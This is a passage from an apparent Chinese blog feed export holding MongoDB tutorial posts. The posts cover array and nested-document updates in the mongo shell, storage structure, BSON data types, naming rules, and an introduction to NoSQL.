<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.findOne()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 10085,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [</span><br><span class="line">                &quot;d&quot;,</span><br><span class="line">                &quot;e&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line">&gt; a = db.user.findOne()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 10085,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [</span><br><span class="line">                &quot;d&quot;,</span><br><span class="line">                &quot;e&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line">&gt; a.email</span><br><span class="line">[ &quot;d&quot;, &quot;e&quot; ]</span><br><span class="line">&gt; a.email[0]</span><br><span class="line">d</span><br><span class="line">&gt; a.email[1]</span><br><span class="line">e</span><br><span class="line">&gt; a.email[1] = &quot;shuaige.qq.com&quot;</span><br><span class="line">shuaige.qq.com</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,a)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line">&gt; db.user.findOne()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 10085,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [</span><br><span class="line">                &quot;d&quot;,</span><br><span class="line">                &quot;shuaige.qq.com&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>2、通过数组.下标修改</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.user.findOne()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 10085,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [</span><br><span class="line">                &quot;d&quot;,</span><br><span class="line">                &quot;shuaige.qq.com&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$set&quot;:&#123;&quot;email.0&quot;:&quot;tim.qq.com&quot;&#125;&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line">&gt; db.user.findOne()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 10085,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [</span><br><span class="line">                &quot;tim.qq.com&quot;,</span><br><span class="line">                &quot;shuaige.qq.com&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>上面的emil.0 相当于emil[0]  通过下标调用mongodb能识别它！</strong></p>
<p><strong>四、文档的文档修改</strong></p>
<p>看下面的例子说明，文档的文档可以通过“.”分法一级一级的嵌套下去修改他如下</p>
<p><strong>1、查询</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; b = db.user.findOne()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 10085,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [</span><br><span class="line">                &quot;tim.qq.com&quot;,</span><br><span class="line">                &quot;shuaige.qq.com&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line">&gt; b.con</span><br><span class="line">b.constructor  b.content</span><br><span class="line">&gt; b.content</span><br><span class="line">&#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;</span><br><span class="line">&gt; b.content.addr</span><br><span class="line">beijing</span><br><span class="line">&gt; b.content.addr</span><br></pre></td></tr></table></figure>

<p><strong>2、修改</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; b.content.code = 123456789</span><br><span class="line">123456789</span><br><span class="line">&gt; b</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 123456789,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [</span><br><span class="line">                &quot;tim.qq.com&quot;,</span><br><span class="line">                &quot;shuaige.qq.com&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line">&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,b)</span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br><span class="line">&gt; db.user.findOne()</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;),</span><br><span class="line">        &quot;uid&quot; : 1,</span><br><span class="line">        &quot;name&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;content&quot; : &#123;</span><br><span class="line">                &quot;addr&quot; : &quot;beijing&quot;,</span><br><span class="line">                &quot;code&quot; : 123456789,</span><br><span class="line">                &quot;qq&quot; : &quot;1234567&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot; : [</span><br><span class="line">                &quot;tim.qq.com&quot;,</span><br><span class="line">                &quot;shuaige.qq.com&quot;</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
        <category>NoSQL</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB[二]:逻辑与物理存储结构</title>
    <url>/articles/ebd79db6.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>对MongoDB中操作逻辑和存储结构进行详细介绍。</p>
<a id="more"></a>

<h2 id="基本的操作"><a href="#基本的操作" class="headerlink" title="基本的操作"></a>基本的操作</h2><h4 id="常用的命令和基础知识"><a href="#常用的命令和基础知识" class="headerlink" title="常用的命令和基础知识"></a><strong>常用的命令和基础知识</strong></h4><p>1、进入MongoDB shell</p>
<p>首先我们进入到MongoDB所在目录执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /work/app/mongodb/bin/</span><br><span class="line">#启动</span><br><span class="line">./mongo</span><br></pre></td></tr></table></figure>

<p>为了方便执行我们可以,这样直接在终端输入mongo调用就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alias mongo=&apos;/work/app/mongodb/bin/mongo&apos;</span><br></pre></td></tr></table></figure>

<p>如果想永久生效,把他加入到/etc/profile中即可<br>2、查看数据库命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#可以通过show dbs;  或者 和Mysql一样执行show databases;</span><br><span class="line"></span><br><span class="line">&gt; show dbs;</span><br><span class="line">local  0.000GB</span><br><span class="line">&gt; show databases;</span><br><span class="line">local  0.000GB</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>3、打开数据库</p>
<p>和关系型数据库中打开数据库是一样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#使用数据库使用use dbs即可，进入后可以使用showtables;去查看数据库中的表</span><br><span class="line">&gt; use dbs;</span><br><span class="line">switched to db dbs</span><br><span class="line">&gt; show tables;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>从上面可以看出，一个MongoDB实例是由一个或多个数据库组成的</strong></p>
<p>但是这里需要注意：</p>
<p>在Mysql中的表中，我们给里面的每行叫做‘记录’，但是在MongoDB中我们给每行数据叫做<strong>‘文档’</strong></p>
<p>所以在MongoDB中我们给每个表叫做<strong>‘集合’</strong>。集合中就是存储了文档的集合。</p>
<p>查看当前数据库中的集合命令为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show collections;</span><br></pre></td></tr></table></figure>

<p><strong>所以：show tables; 和 show databases;命令只是兼容关系型数据库而已，因此他们之间的层次关系就明白了，NICE~</strong></p>
<p><strong>总结：</strong></p>
<p>1、MongoDB逻辑概念总结</p>
<p>文档：文档(Document)是MongodDB中的核心概念，他是MongoDB逻辑存储的最小基本单元</p>
<p>集合：多个文档组成的集合</p>
<p>数据库：多个集合组成的数据库</p>
<table>
<thead>
<tr>
<th>MongoDb</th>
<th>关系型数据库Mysql</th>
</tr>
</thead>
<tbody><tr>
<td>文档(document)</td>
<td>行(row)</td>
</tr>
<tr>
<td>集合(collections)</td>
<td>表(table)</td>
</tr>
<tr>
<td>数据库(databases)</td>
<td>数据库(databases)</td>
</tr>
</tbody></table>
<p>2、MongoDB 物理存储总结</p>
<p>2.1 命名空间文件：命名空间(.ns结尾文件) 它存储了分配和正在使用的磁盘空间</p>
<p>2.2 数据库文件：以(0,1,2,3…)结尾的，并且后面的文件大小是前面一个文件大小的2倍！</p>
<p>为什么MongodDB物理存储使用这种方式设计呢？好处是什么？：当一方面如果数据库很小的时候，不至于数据库小而浪费存储空间，另外一方面如果数据库增长比较快，通过预分配的方式，是上一个文件的两倍的办法，来避免数据的剧增造成分配文件造成的性能下降，来预分配空间，以空间的办法来换取性能的提升。</p>
<p>2.3 日志文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">系统日志文件logpath</span><br><span class="line">oplog复制操作日志文件 #只有在主从复制开启之后才会出现</span><br><span class="line">慢查询日志  #需要开启后才可以</span><br></pre></td></tr></table></figure>

<p>慢查询日志通过help就可以看到如何启用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#这两个参数需要组合使用 --slowms 大于多少秒才算慢查询 </span><br><span class="line">--slowms arg (=100)                   value of slow for profile and console </span><br><span class="line">                                      log</span><br><span class="line">#默认是关闭的1为慢查询，all为所有的都日志</span><br><span class="line">--profile arg                         0=off 1=slow, 2=all</span><br></pre></td></tr></table></figure>

<p>我们可以通过配置文件进行设置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">profile=1</span><br><span class="line">#生产中这里应该大于200毫秒，并且这个必须根据生产中实际的需求来定义的</span><br><span class="line">slowms=1</span><br></pre></td></tr></table></figure>

<p><strong>MongoDB数据类型</strong></p>
<p>MongodDB的数据类型是：BSON的数据类型</p>
<p><strong>BSON</strong>：是Binary JSON是二进制的格式，能将MongoDB的所有文档表示为字节字符串！</p>
<p><strong>JSON：</strong>是一种轻量级的数据交换格式。它基于JavaScript的一个子集！</p>
<p><strong>一、在初识MongoDB的时候了解“帮助”</strong></p>
<p><strong>1、最高的帮助</strong></p>
<p>在MongoDB shell中输入help</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; help</span><br><span class="line">        db.help()                    help on db methods</span><br><span class="line">        db.mycoll.help()             help on collection methods</span><br><span class="line">        sh.help()                    sharding helpers</span><br><span class="line">        rs.help()                    replica set helpers</span><br><span class="line">        help admin                   administrative help</span><br><span class="line">        help connect                 connecting to a db help</span><br><span class="line">        help keys                    key shortcuts</span><br><span class="line">        help misc                    misc things to know</span><br><span class="line">        help mr                      mapreduce</span><br><span class="line"></span><br><span class="line">        show dbs                     show database names</span><br><span class="line">        show collections             show collections in current database</span><br><span class="line">        show users                   show users in current database</span><br><span class="line">        show profile                 show most recent system.profile entries with time &gt;= 1ms</span><br><span class="line">        show logs                    show the accessible logger names</span><br><span class="line">        show log [name]              prints out the last segment of log in memory, &apos;global&apos; is default</span><br><span class="line">        use &lt;db_name&gt;                set current database</span><br><span class="line">        db.foo.find()                list objects in collection foo</span><br><span class="line">        db.foo.find( &#123; a : 1 &#125; )     list objects in foo where a == 1</span><br><span class="line">        it                           result of the last line evaluated; use to further iterate</span><br><span class="line">        DBQuery.shellBatchSize = x   set default number of items to display on shell</span><br><span class="line">        exit                         quit the mongo shell</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>2、打开数据库在数据库中查看帮助</strong></p>
<p>进入到数据库中后我们可以使用db.help()查看数据库级别的帮助</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.help()  #查看数据库级别的帮助,里面会显示数据库级别的帮助</span><br></pre></td></tr></table></figure>

<p><strong>3、查看集合中的帮助</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; show dbs;</span><br><span class="line">local  0.000GB</span><br><span class="line">tim    0.000GB</span><br><span class="line">&gt; show collections;</span><br><span class="line">users</span><br><span class="line">&gt; db.users.help()</span><br></pre></td></tr></table></figure>

<h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a><strong>创建数据库</strong></h4><p>查看当前的数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; show dbs;</span><br><span class="line">local  0.000GB</span><br><span class="line">tim    0.000GB</span><br></pre></td></tr></table></figure>

<p>可以看到当前只有tim和系统自带的local数据库，我们通过use 去打开一个数据库！shuai并且查看数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; use shuai;</span><br><span class="line">switched to db shuai</span><br><span class="line">&gt; show dbs;</span><br><span class="line">local  0.000GB</span><br><span class="line">tim    0.000GB</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>发现数据库并没有添加，当我们在给数据库中的集合插入一条文档的时候就会：<strong>自动创建一条文档合、一个集合、一个数据库。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.users.insert(&#123;&quot;uid&quot;:1&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt; </span><br><span class="line">#这个时候看下是否添加了数据库和集合！！！</span><br><span class="line">&gt; show dbs;</span><br><span class="line">local  0.000GB</span><br><span class="line">shuai  0.000GB</span><br><span class="line">tim    0.000GB</span><br><span class="line"></span><br><span class="line">#当前数据库&quot;shuai&quot;下的集合</span><br><span class="line">&gt; show collections;</span><br><span class="line">users</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p><strong>2、插入一条数据</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.users.insert(&#123;&quot;uid&quot;:2,&quot;uname&quot;:&quot;luotianshuai&quot;,&quot;isvip&quot;:true,&quot;sex&quot;:null,&quot;favorite&quot;:[&quot;apple&quot;,&quot;banana&quot;,1,2,3,4,5],&quot;regtime&quot;:new Date()&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt; db.users.find()</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5754f1ea4b7f62c4992c4ef4&quot;), &quot;uid&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5754f2c84b7f62c4992c4ef5&quot;), &quot;uid&quot; : 2, &quot;uname&quot; : &quot;luotianshuai&quot;, &quot;isvip&quot; : true, &quot;sex&quot; : null, &quot;favorite&quot; : [ &quot;apple&quot;, &quot;banana&quot;, 1, 2, 3, 4, 5 ], &quot;regtime&quot; : ISODate(&quot;2016-06-06T03:49:28.946Z&quot;) &#125;</span><br></pre></td></tr></table></figure>

<p>注：这里的数据类型，列表、字典，这里的new Date()是MongoDB就类似Django Model的时间选项类似于：date = models.DateTimeField(auto_now=True)</p>
<p><strong>3、查询数据</strong></p>
<p>查询一条数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.users.findOne(&#123;&quot;uid&quot;:2&#125;)</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;5754f2c84b7f62c4992c4ef5&quot;),</span><br><span class="line">        &quot;uid&quot; : 2,</span><br><span class="line">        &quot;uname&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;isvip&quot; : true,</span><br><span class="line">        &quot;sex&quot; : null,</span><br><span class="line">        &quot;favorite&quot; : [</span><br><span class="line">                &quot;apple&quot;,</span><br><span class="line">                &quot;banana&quot;,</span><br><span class="line">                1,</span><br><span class="line">                2,</span><br><span class="line">                3,</span><br><span class="line">                4,</span><br><span class="line">                5</span><br><span class="line">        ],</span><br><span class="line">        &quot;regtime&quot; : ISODate(&quot;2016-06-06T03:49:28.946Z&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>并且我们可以吧取出来的数据保存在一个变量中，并且通过变量去调用其值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; a = db.users.findOne(&#123;&quot;uid&quot;:2&#125;)</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;5754f2c84b7f62c4992c4ef5&quot;),</span><br><span class="line">        &quot;uid&quot; : 2,</span><br><span class="line">        &quot;uname&quot; : &quot;luotianshuai&quot;,</span><br><span class="line">        &quot;isvip&quot; : true,</span><br><span class="line">        &quot;sex&quot; : null,</span><br><span class="line">        &quot;favorite&quot; : [</span><br><span class="line">                &quot;apple&quot;,</span><br><span class="line">                &quot;banana&quot;,</span><br><span class="line">                1,</span><br><span class="line">                2,</span><br><span class="line">                3,</span><br><span class="line">                4,</span><br><span class="line">                5</span><br><span class="line">        ],</span><br><span class="line">        &quot;regtime&quot; : ISODate(&quot;2016-06-06T03:49:28.946Z&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#并且可以通过变量去调用里面的值</span><br><span class="line">&gt; a.</span><br><span class="line">a._id                    a.favorite               a.isvip                  a.regtime                a.toLocaleString(        a.uid                    a.valueOf(</span><br><span class="line">a.constructor            a.hasOwnProperty(        a.propertyIsEnumerable(  a.sex                    a.toString(              a.uname</span><br><span class="line">&gt; a.</span><br></pre></td></tr></table></figure>

<h4 id="MongoDB中的数据类型和Mysql数据类型对比"><a href="#MongoDB中的数据类型和Mysql数据类型对比" class="headerlink" title="MongoDB中的数据类型和Mysql数据类型对比"></a><strong>MongoDB中的数据类型和Mysql数据类型对比</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.users.insert(&#123;&quot;uid&quot;:3,&quot;salary&quot;:312402039840981098098309,&quot;a&quot;:1.2423412314223423413&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line"></span><br><span class="line">&gt; b = db.users.findOne(&#123;&quot;uid&quot;:3&#125;)</span><br><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;5754f7214b7f62c4992c4ef6&quot;),</span><br><span class="line">        &quot;uid&quot; : 3,</span><br><span class="line">        &quot;salary&quot; : 3.124020398409811e+23,</span><br><span class="line">        &quot;a&quot; : 1.2423412314223423</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>1、MongoDB中的数字类型和Mysql中的数字类型对比</strong></p>
<p>查看MongoDB中的数字类型他们都是<strong>numbe</strong>r类型的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; typeof(b.uid)</span><br><span class="line">number</span><br><span class="line">&gt; typeof(b.salary)</span><br><span class="line">number</span><br><span class="line">&gt; typeof(b.a)</span><br><span class="line">number</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>可以看出在MongoDB中所有的数字类型都是数值类型的，我们比较下Mysql中的数字类型！</p>
<p>在Mysql中类似“uid”:3 这个3应该属于普通的整数，或者是短整形</p>
<p>类似薪水：salary 应该是长整型</p>
<p>类似a应该是双精度浮点型</p>
<p><strong>数字：</strong></p>
<p><strong>在Mysql中对数字类型分的非常详细，有短整形、长整型，浮点数分为单精度和双精度浮点型，而在MongoDB都是64位的浮点数！这样的好处就是很简单，他不需要区分数字类型，就是number类型，简单、简洁。容易理解和在处理的时候也方便。</strong></p>
<p><strong>字符串：</strong></p>
<p>在Mysql中分为定长、变长字符串，无论是定长字符串或者变长字符串，都要对长度事先定义！但是MongoDB中无需事先定义，对长度没有并且的定义并且他甚至可以存储一篇文章！也表现的简单、简洁、</p>
<p><strong>布尔型：</strong></p>
<p>布尔值只有：真、假分别用：True  False  表示</p>
<p><strong>null值：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.users.find(&#123;&quot;sex&quot;:null&#125;)</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5754f1ea4b7f62c4992c4ef4&quot;), &quot;uid&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5754f2c84b7f62c4992c4ef5&quot;), &quot;uid&quot; : 2, &quot;uname&quot; : &quot;luotianshuai&quot;, &quot;isvip&quot; : true, &quot;sex&quot; : null, &quot;favorite&quot; : [ &quot;apple&quot;, &quot;banana&quot;, 1, 2, 3, 4, 5 ], &quot;regtime&quot; : ISODate(&quot;2016-06-06T03:49:28.946Z&quot;) &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5754f7214b7f62c4992c4ef6&quot;), &quot;uid&quot; : 3, &quot;salary&quot; : 3.124020398409811e+23, &quot;a&quot; : 1.2423412314223423 &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>咱们查询以”sex“ 为null条件，但是查询出了3条结果可以得出：</p>
<p>在MongoDB中，1、<strong>null代表着值为null</strong>   2、<strong>者字段不存在。</strong></p>
<p>那么怎么把字段存在并且为null值得文档查找出来呢？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.users.find(&#123;&quot;sex&quot;:null,&quot;sex&quot;:&#123;&quot;$exists&quot;:true&#125;&#125;)</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5754f2c84b7f62c4992c4ef5&quot;), &quot;uid&quot; : 2, &quot;uname&quot; : &quot;luotianshuai&quot;, &quot;isvip&quot; : true, &quot;sex&quot; : null, &quot;favorite&quot; : [ &quot;apple&quot;, &quot;banana&quot;, 1, 2, 3, 4, 5 ], &quot;regtime&quot; : ISODate(&quot;2016-06-06T03:49:28.946Z&quot;) &#125;</span><br><span class="line">&gt; </span><br><span class="line">#我们查找sex为null的并且给其加一个条件    值存在&#123;&quot;$exists&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p><strong>数组：</strong></p>
<p>一组数据集合</p>
<p><strong>对象类型：</strong></p>
<p>比如日期类型，日期类型是通过对象类型产生的，但是处理日期比较麻烦！这个也是MongoDB的问题表现力不足</p>
<p><strong>BSON的特点：</strong>优点：简单、简洁、容易理解、解析方便、记忆</p>
<p>缺点：表现力不足比如日期格式（处理起来就比较麻烦）</p>
<h4 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a><strong>命名规则</strong></h4><p><strong>1、文档的键名命名几乎所有utf8字符串，只有以下少数例外</strong></p>
<ol>
<li>$开头</li>
<li>\0   空字符串</li>
<li>_下划线开头，可以用但是不建议使用，凡是系统生成的都是以_开头命名的，所以在实际生产中我们不使用_开头的！</li>
</ol>
<p><strong>2、集合的命名几乎所有的utf8字符串，只有以下少数例外</strong></p>
<ol>
<li><p>$开头</p>
</li>
<li><p>\0   空字符串</p>
</li>
<li><p>system.开头</p>
</li>
<li><p>”“空字符串</p>
<p><strong>3、数据库的命名几乎所有的utf8字符串，只有以下少数例外</strong></p>
</li>
<li><p>$开头</p>
</li>
<li><p>\0   空字符串</p>
</li>
<li><p>system.开头</p>
</li>
<li><p>”“空字符串</p>
</li>
<li><p>/</p>
</li>
<li><p>\</p>
</li>
</ol>
<p>并且这里需要注意：<strong>数据库名是不区分大小写的</strong>，如果你有一个shuai的数据库，你在创建一个SHUAI的数据库插入数据的时候就会报错，我们一般创建数据库的时候都把MongoDB的数据库名为小写。</p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>NoSQL</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB[一]:初识</title>
    <url>/articles/35556fc0.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文对Nosql进行介绍，并且引申出mongodb，进而对mango安装过程进行记录。</p>
<a id="more"></a>

<h2 id="NoSQL介绍"><a href="#NoSQL介绍" class="headerlink" title="NoSQL介绍"></a>NoSQL介绍</h2><h4 id="NoSQL简介"><a href="#NoSQL简介" class="headerlink" title="NoSQL简介"></a><strong>NoSQL简介</strong></h4><p>NoSQL,全称是”Not Only Sql”,指的是非关系型的数据库。</p>
<p>非关系型数据库主要有这些特点:<strong>非关系型的、分布式的、开源的、水平可扩展的</strong>。</p>
<p>原始的目的是为了大规模 web 应用,这场全 新的数据库革命运动早期就有人提出,发展至 2009 年趋势越发高涨。</p>
<p>NoSQL 的拥护者们提倡运用非关系型的数据存储,通常的应用如:模式自由、支持简易复制、简单的 API、最终 的一致性(非 ACID)、大容量数据等。</p>
<p>NoSQL 被我们用得最多的当数 <strong>key-value 存储（如Redis）</strong>,当然还 有其他的<strong>文档型的、列存储、图型数据库、xml 数据库</strong>等。 </p>
<h4 id="为什么会有NoSQL"><a href="#为什么会有NoSQL" class="headerlink" title="为什么会有NoSQL"></a><strong>为什么会有NoSQL</strong></h4><p>通用关系数据库功能强大，遵循SQL标准，而且性能卓越而且稳定为什么会出现NoSQL呢？</p>
<p>上面也说过了NoSQL的初识是随着WEB应用的飞速发展中出现的，在期间遇到了一些关系型数据库难以克服的问题，例如：</p>
<p>1、Highperformance- 对数据库高并发读写的需求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">web2.0 网站要根据用户个性化信息来实时生成动态页面和提供动态信息,所以基本上无法 使用动态页面静态化技术,因此数据库并发负载非常高,往往要达到每秒上万次读写请求。 </span><br><span class="line">关系型数据库应付上万次 SQL 查询还勉强顶得住,但是应付上万次 SQL 写数据请求,硬盘 IO 就已经无法承受了,其实对于普通的 BBS 网站,往往也存在对高并发写请求的需求。</span><br></pre></td></tr></table></figure>

<p>2、HugeStorage- 对海量数据的高效率存储和访问的需求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对于大型的 SNS 网站,每天用户产生海量的用户动态信息,以国外的 Friend feed 为例,一 个月就达到了 2.5 亿条用户动态,</span><br><span class="line">对于关系数据库来说,在一张 2.5 亿条记录的表里面进行 SQL 查询,效率是极其低下乃至不可忍受的。</span><br><span class="line">再例如大型 web 网站的用户登录系统,例如腾 讯,盛大,动辄数以亿计的帐号,关系数据库也很难应付。</span><br></pre></td></tr></table></figure>

<p>3、HighScalability&amp;&amp;HighAvailability- 对数据库的高可扩展性和高可用性的需求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">随着数据库的不断增加，你的数据库没有办法向webserver或app那样简单的通过增加硬件来提升性能和负载能力。</span><br><span class="line">并且mysql没有提供水平拆分的和扩容的方案，这是非常头疼的一件事情。</span><br></pre></td></tr></table></figure>

